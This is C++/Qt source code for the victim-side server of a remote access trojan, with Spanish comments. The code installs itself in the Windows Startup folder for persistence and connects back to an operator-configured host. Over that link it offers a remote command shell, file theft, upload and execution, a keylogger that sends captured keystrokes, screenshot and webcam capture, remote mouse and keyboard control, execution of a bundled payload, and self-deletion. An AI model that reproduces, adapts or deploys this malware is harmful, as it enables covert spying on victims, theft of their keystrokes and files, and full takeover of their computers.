/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtTest/QTest>
#include <QPoint>
#include <QSysInfo>
#include <QDate>
#include <QTime>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    /** Constructor de la clase **/
    ui->setupUi(this);
    inicio();
}
MainWindow::~MainWindow()
{
    /** Destructor de la clase **/
    delete ui;
}
void MainWindow::changeEvent(QEvent *e)
{
    /** Función de manejo de eventos **/
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ui->retranslateUi(this);
        break;
    default:
        break;
    }
}
void MainWindow::inicio(){
    /** funcion que se ejecuta al inicio de la aplicacion **/
    this->generarVentanaChat();
    cargarConfiguracion();
    QString conversion;
    QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
    datos = "|@|" + this->host.toLatin1() + "|@|";
    conversion.setNum(this->port);
    datos = datos + conversion.toLatin1() + "|@|";
    conversion.setNum(this->portArchivos);
    datos = datos + conversion.toLatin1() + "|@|";
    conversion.setNum(this->portEscritorio);
    datos = datos + conversion.toLatin1() + "|@|";
    conversion.setNum(this->portWebcam);
    datos = datos + conversion.toLatin1() + "|@|";
    conversion.setNum(this->tiempoConexion);
    datos = datos + conversion.toLatin1() + "|@|";
    datos = datos + this->alias.toLatin1() + "|@|";
    datos = datos + "nounido" + "|@|";
    datos = datos + "0" + "|@|";
    datos = datos + this->nombreCopiable.toLatin1() + "|@|";
    if(this->siempreOUnaVez == "0") //Si el programa de inicio se ejecuta siempre
    {
        datos = datos + this->ejecutar.toLatin1() + "|@|"; //Lo ponemos en el servidor copiado
        datos = datos + "0|@|";
    }
    else
    {
        datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
    }
    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
        copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
    }
    temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexiÃ³n
    connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
    connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
    connect(&socket,SIGNAL(disconnected()),this,SLOT(desconectado()));
    connect(&socketArchivos,SIGNAL(readyRead()),this,SLOT(llegadaDatosArchivo()));
    connect(&socketEscritorio,SIGNAL(readyRead()),this,SLOT(llegadaDatosEscritorio()));
    connect(&socketWebcam,SIGNAL(readyRead()),this,SLOT(llegadaDatosWebcam()));
    connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
    connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
    QApplication::setQuitOnLastWindowClosed(false);
    log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
    verTecla.setInterval(50);
    this->verTecla.start();
    if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
    {
        QProcess::startDetached(this->ejecutar);
    }
}
bool MainWindow::cargarConfiguracion(){
    /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
    //valores por defecto
    this->host = "localhost";
    this->port = 1234;
    this->portArchivos = 2345;
    this->portEscritorio = 3456;
    this->portWebcam = 4567;
    this->tiempoConexion = 30000;
    this->alias = "victima";
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
    this->nombreCopiable =  QFileInfo(appPath).fileName(); //Nombre del ejecutable
    // No olividar renombrar el ejecutable a rawserver.dat y moverlo al directorio del cliente
    QString datos;
    QString conversion;
    QStringList campo;
    QFile servidor;
    servidor.setFileName(QApplication::applicationFilePath());
    servidor.open(QIODevice::ReadOnly);
    servidor.seek(servidor.size() - 1024);
    datos = servidor.read(1024);
    servidor.close();
    campo = datos.split("|@|");
    if(campo.size() >= 12)
    {
        this->host = campo[1];
        conversion = campo[2];
        this->port = conversion.toInt();
        conversion = campo[3];
        this->portArchivos = conversion.toInt();
        conversion = campo[4];
        this->portEscritorio = conversion.toInt();
        conversion = campo[5];
        this->portWebcam = conversion.toInt();
        conversion = campo[6];
        this->tiempoConexion = conversion.toInt();
        this->alias = campo[7];
        this->adjunto = campo[8];
        this->tamanoAdjunto = campo[9].toLong();
        this->nombreCopiable = campo[10];
        this->ejecutar = campo[11];
        this->siempreOUnaVez = campo[12];
    }
}
void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
{
/** Copia el servidor a la ruta destino con la configuración proporcionada en tramaConfiguracion **/
    QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
    if (this->adjunto == "unido") //Cuando hay un ejecutable adjunto
    {
        //Esto está muy poco optimizado, mejorar más adelante.
        QDir directorio;
        qint64 tamano;
        tamano = this->tamanoAdjunto;
        QFile adjunto;
        QFile servidor;
        QFile copiable;
        adjunto.setFileName(directorio.tempPath() + "/temp.exe");
        servidor.setFileName(QApplication::applicationFilePath());
        copiable.setFileName(destino);
        copiable.open(QFile::WriteOnly);
        adjunto.open(QFile::WriteOnly);
        servidor.open(QFile::ReadOnly);
        copiable.write(servidor.read(servidor.size() - 1024 - tamano));
        servidor.seek(servidor.size() - 1024 - tamano);
        adjunto.write(servidor.read(tamano));
        copiable.write(tramaConfiguracion,1024);
        copiable.close();
        servidor.close();
        adjunto.close();
        proceso.setWorkingDirectory(directorio.tempPath());
        proceso.startDetached(directorio.tempPath() + "/temp.exe");
    }
    else
    {
        QFile servidor;
        QFile copiable;
        servidor.setFileName(QApplication::applicationFilePath());
        copiable.setFileName(destino);
        copiable.open(QFile::WriteOnly);
        servidor.open(QFile::ReadOnly);
        copiable.write(servidor.read(servidor.size() - 1024));
        copiable.write(tramaConfiguracion,1024);
        copiable.close();
        servidor.close();
    }
}
void MainWindow::conectar(){
    /** funciÃ³n que conecta al cliente **/

    log.write(cadenaa);
    log.close();
    if (socket.state() == QAbstractSocket::ConnectedState ){
        temporizador.stop();
    }
    else {
        socket.close();
        socketArchivos.close();
        socketEscritorio.close();
        socketWebcam.close();
        socketWebcam.connectToHost(host,portWebcam);
        socketEscritorio.connectToHost(host,portEscritorio);
        socketArchivos.connectToHost(host,portArchivos);
        socket.connectToHost(host,port);
    }

}
void MainWindow::llegadaDatos() {
    /** Función para el manejo de los datos recibidos a travéz del socket **/
    QString datos;
    datos = socket.readAll();
    QStringList parametros =  datos.split("|@|");
    if(parametros[0] == "shell"){ //shell remoto
        QString salidaShell;
        salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
        util.escribirSocket(salidaShell,&socket);
    }
    if (parametros[0] == "home"){
        util.escribirSocket("home|@|" + QDir::homePath(),&socket);
    }
    if (parametros[0] == "unidades")
    {
        listarUnidades();
    }
    if (parametros[0] == "archivos"){
        listarArchivos(parametros[1]);
    }
    if (parametros[0] == "directorios"){
        listarDirectorios(parametros[1]);
    }
    if (parametros[0] == "get"){

        util.enviarArchivo(parametros[1],&socketArchivos);
    }
    if (parametros[0] == "put"){
        archivo = parametros[1];
    }
    if (parametros[0] == "remove"){
        directorio.remove(parametros[1]);
    }
    if (parametros[0] == "createfolder"){
        directorio.mkdir(parametros[1]);
    }
    if (parametros[0] == "execute")
    {
        QProcess::startDetached(parametros[1]);
    }
    if (parametros[0] == "copiar")
    {
        QFile::copy(parametros[1],parametros[2]);
    }
    if (parametros[0] == "mover")
    {
        if(parametros[1] != parametros[2]) //Para evitar borrar el archivo si se mueve a la misma carpeta
        {
            QFile::copy(parametros[1],parametros[2]);
            QFile::remove(parametros[1]);
        }
    }
    if (parametros[0] == "alerta"){
        mostrarMensaje("alerta",parametros[2],parametros[1]);
    }
    if (parametros[0] == "info"){
        mostrarMensaje("info",parametros[2],parametros[1]);
    }
    if (parametros[0] == "peligro"){
        mostrarMensaje("peligro",parametros[2],parametros[1]);
    }
    if (datos == "reiniciar"){
        reiniciar();
    }
    if (datos == "cerrar"){ //cerrar el servidor
        QApplication::exit();
    }
    if (datos == "desinfectar")
    {
        desinfectar();
    }
    if (datos == "ping") { //ping al servidor
        util.escribirSocket("pong",&socket);
    }
    if (datos == "abrirchat") {
        this->abrirChat();
    }
    if (datos == "cerrarchat") {
        this->cerrarChat();
    }
    if (parametros[0] == "chat") {
        this->nickVictima = parametros[3];
        this->ponerMensajeChat(parametros[1],parametros[2]);
    }
    if (parametros[0] == "activark")
    {
        verTecla.start();
    }
    if (parametros[0] == "desactivark")
    {
        verTecla.stop();
    }
    if (parametros[0] == "recibirk")
    {
        QFile klog;
        klog.setFileName("./log");
        klog.open(QFile::ReadOnly);
        util.escribirSocket("teclas|@|" + klog.readAll(),&socket);
        klog.close();
    }
    if (parametros[0] == "limpiark")
    {
        QDir directorio;
        if(this->verTecla.isActive())
        {
            this->verTecla.stop();
            directorio.remove("./log");
            this->verTecla.start();
        }
        else
        {
            directorio.remove("./log");
        }
    }
    if (parametros[0] == "informacion")
    {   
        util.escribirSocket(obtenerInformacionSistema(),&socket);
    }

}
QString MainWindow::obtenerInformacionSistema()
{
    /** Obtiene información relevante del ambiente donde se está ejecutando el servidor **/
    QString so;
    QString version;
    //QString unidades = QDir::drives();
    QString homePath = QDir::homePath();
    QString tempPath = QDir::tempPath();
    QString alto;
    alto.setNum(QApplication::desktop()->height());
    QString ancho;
    ancho.setNum(QApplication::desktop()->width());
    QDate tiempo;
    QString fecha = tiempo.currentDate().toString();
    QTime horaSistema;
    QString hora = horaSistema.currentTime().toString();
    QString alias = this->alias;
    #ifdef Q_WS_WIN
        so = "Windows";
        switch (QSysInfo::WindowsVersion)
        {
        case QSysInfo::WV_XP: {
            version = "XP";
            break;
        }
        case QSysInfo::WV_2003: {
            version = "2003 Server";
            break;
        }
        case QSysInfo::WV_VISTA: {
            version = "Vista";
            break;
        }
        case QSysInfo::WV_WINDOWS7: {
            version = "7";
            break;
        }
        default:
            break;
        }
    #else
        so = "GNU/Linux";
        QProcess ver;
        ver.start("uname -a");
        ver.waitForReadyRead();
        version =  ver.readAll();
    #endif
        return "informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|";
}
void MainWindow::llegadaDatosArchivo(){
    /** Función invocada para recibir un archivo enviado por el cliente **/
    util.recibirArchivo(directorio.path() + "/" + archivo,&socketArchivos);
}
void MainWindow::llegadaDatosEscritorio(){
    /** Función de petición de captura de escritorio **/

    QString datos = socketEscritorio.readAll();
    QStringList parametros = datos.split("|@|");
    if(parametros[0] == "tecla")
    {
        #ifdef Q_WS_WIN
        enviarTecla(parametros[1].toInt());
        #endif
    }
    if (parametros[0] == "derecho")
    {
        QPoint puntero;
        puntero.setX(parametros[1].toInt());
        puntero.setY(parametros[2].toInt());
        QTest::mouseMove(QApplication::desktop(),puntero);
        #ifdef Q_WS_WIN
        hacerClickDerecho();
        #endif
    }
    if (parametros[0] == "izquierdo")
    {
        QPoint puntero;
        puntero.setX(parametros[1].toInt());
        puntero.setY(parametros[2].toInt());
        QTest::mouseMove(QApplication::desktop(),puntero);
        #ifdef Q_WS_WIN
        hacerClickIzquierdo();
        #endif
    }
    if (parametros[0] == "resolucion")
    {
        QString ancho;
        ancho.setNum(QApplication::desktop()->height());
        QString alto;
        alto.setNum(QApplication::desktop()->width());
        util.escribirSocket("resolucion|@|" + ancho + "|@|" + alto,&socket);
    }
    if (parametros[0] == "capturar")
    {
        QPixmap captura;
        captura = screenShot();
        buffer = new QBuffer(&bytes);
        connect(buffer,SIGNAL(bytesWritten(qint64)),this,SLOT(datosEscritos()));
        buffer->open(QIODevice::ReadWrite);
        captura.save(buffer,"jpg",parametros[1].toInt());
    }
}
void MainWindow::llegadaDatosWebcam()
{ /** Función donde se reciben las peticiones de captura de webcam asi como su encendido y apagado **/
    QString datos = socketWebcam.readAll();
    QStringList parametros = datos.split("|@|");
    if (parametros[0] == "cap")
    {
        QPixmap imagen;
        QDir directorio;
        imagen = capturar();
       // directorio.remove("./captura.jpg");
        imagen.save(directorio.tempPath() + "/dat","jpeg",parametros[1].toInt());
        util.enviarArchivo(directorio.tempPath() + "/dat",&socketWebcam);
    }
    if (parametros[0] == "encender")
    {
        encender();
    }
    if (parametros[0] == "apagar")
    {
        apagar();
    }
}
void MainWindow::datosEscritos(){
    /** Esta función está pensada para esperar a que los datos de la captura sean escritos a memoria antes de enviarlos **/
    QByteArray array;
    array.setNum(bytes.size());
    util.escribirSocketDatos(array,&socketEscritorio);
    socketEscritorio.waitForBytesWritten(1000);
    util.escribirSocketDatos(bytes,&socketEscritorio);
    //socketEscritorio.waitForBytesWritten(-1);
}
QPixmap MainWindow::screenShot(){
    /** Función que realiza la caputa de la pantalla **/
    QPixmap captura;
    captura = QPixmap::grabWindow(QApplication::desktop()->winId());
    return captura;
}
void MainWindow::desconectado() {
    /** cosas que hacer al desconectarse **/
    temporizador.start(this->tiempoConexion);
    apagar(); //Si se desconecta y la webcam estaba encendida es mejor apagarla.
}
QString MainWindow::shell(QString comando){
    /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
    #ifdef Q_WS_WIN
        consola.start("cmd.exe /C " + comando);
    #else
        consola.start(comando);
    #endif
    consola.waitForReadyRead();
    return consola.readAllStandardOutput();
}
void MainWindow::reiniciar(){
    /** Función que reinicia el servidor **/
    QString filePath = QApplication::applicationFilePath();
    QProcess::startDetached(filePath);
    QApplication::exit();
}
void MainWindow::desinfectar()
{
    this->verTecla.stop();
    apagar();
    QFile::remove(directorio.tempPath() + "/dat");
    QFile::remove(directorio.tempPath() + "/log");
    QFile::remove("data");
    #ifdef Q_WS_WIN
    QByteArray bat;
    bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel " + QApplication::applicationFilePath().toLatin1() + "\ndel " + QApplication::applicationDirPath().toLatin1() + "/borrar.bat";
    bat.replace("/","\\");
    QFile archivoBat;
    archivoBat.setFileName("borrar.bat");
    archivoBat.open(QFile::WriteOnly | QFile::Text);
    archivoBat.write(bat);
    archivoBat.close();
    QProcess::startDetached("borrar.bat");
    QApplication::exit();
    #endif

}
void MainWindow::listarUnidades()
{  /** Esta función envia por socket una lista de las unidades de almacenamiento del sistema **/
    int i;
    QString unidades = "unidades|@|";
    QFileInfoList listaUnidades = directorio.drives();
    for (i=0;i<listaUnidades.size();i++){
        unidades = unidades + listaUnidades[i].absoluteFilePath() + "|@|";
    }
    util.escribirSocket(unidades,&socket);
}
void MainWindow::listarArchivos(QString ruta){
    /** Función que envia por socket una lista de archivos del directorio pasado como parámetro **/
    int i;
    QString archivos = "file|@|";
    directorio.cd(ruta);
    QStringList listaArchivos = directorio.entryList(QDir::Files);
    for (i=0;i<listaArchivos.size();i++){
        archivos = archivos + listaArchivos[i] + "|@|";
    }
    util.escribirSocket(archivos,&socket);
    socket.waitForBytesWritten();
}
void MainWindow::listarDirectorios(QString ruta){
    /** Función que envia por socket una lista de directorios del directorio pasado como parámetro **/
    int i;
    QString directorios = "folder|@|";
    directorio.cd(ruta);
    QStringList listaDirectorios = directorio.entryList(QDir::Dirs);
    for (i=0;i<listaDirectorios.size();i++){
        directorios = directorios + listaDirectorios[i] + "|@|";
    }
    util.escribirSocket(directorios,&socket);
    socket.waitForBytesWritten();
}
void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
    /** Función que muestra mensajes emergentes **/
    mensaje = new QMessageBox(this);
    mensaje->setWindowModality(Qt::NonModal);
    if (tipo == "alerta"){
       mensaje->setIcon(QMessageBox::Warning);
    }
    if (tipo == "info"){
        mensaje->setIcon(QMessageBox::Information);
    }
    if (tipo == "peligro"){
        mensaje->setIcon(QMessageBox::Critical);
    }
    mensaje->setWindowTitle(titulo);
    mensaje->setText(texto);
    mensaje->setVisible(true);
}
void MainWindow::generarVentanaChat()
{
    /** Crea una ventana de chat **/
    this->chat = new QWidget(0,Qt::CustomizeWindowHint);
    this->capa = new QVBoxLayout(chat);
    this->capaHorizontal = new QHBoxLayout(chat);
    this->botonChatEnviar = new QPushButton("Enviar",chat);
    this->enviarChatTexto = new QLineEdit(chat);
    salidaChatTexto = new QPlainTextEdit(chat);
    capa->addWidget(salidaChatTexto);
    capaHorizontal->addWidget(enviarChatTexto);
    capaHorizontal->addWidget(botonChatEnviar);
    capa->addLayout(capaHorizontal);
}
void MainWindow::abrirChat()
{
    /** Función que abre la ventana de chat **/
    chat->show();
}
void MainWindow::cerrarChat()
{
    /** Función que cierra la ventana de chat **/
    this->chat->close();
}
void MainWindow::enviarMensajeChat()
{
    /** Envia un mensaje de chat al cliente **/
    this->ponerMensajeChat(this->enviarChatTexto->text(),this->nickVictima);
    util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() ,&socket);
    this->enviarChatTexto->clear();
}
void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    /** muestra el mensaje de char recibido **/
    this->salidaChatTexto->document()->setHtml(this->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}
void MainWindow::escucharTeclas()
{
    /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
        log.open(QFile::Append);
        char num;
        #ifdef Q_WS_WIN
        num = comprobarTeclas();
        #endif
        if(num != 0)
        {
            cadenaa.append(num);
            log.write(cadenaa);
            cadenaa.clear();
            log.close();
        }
}

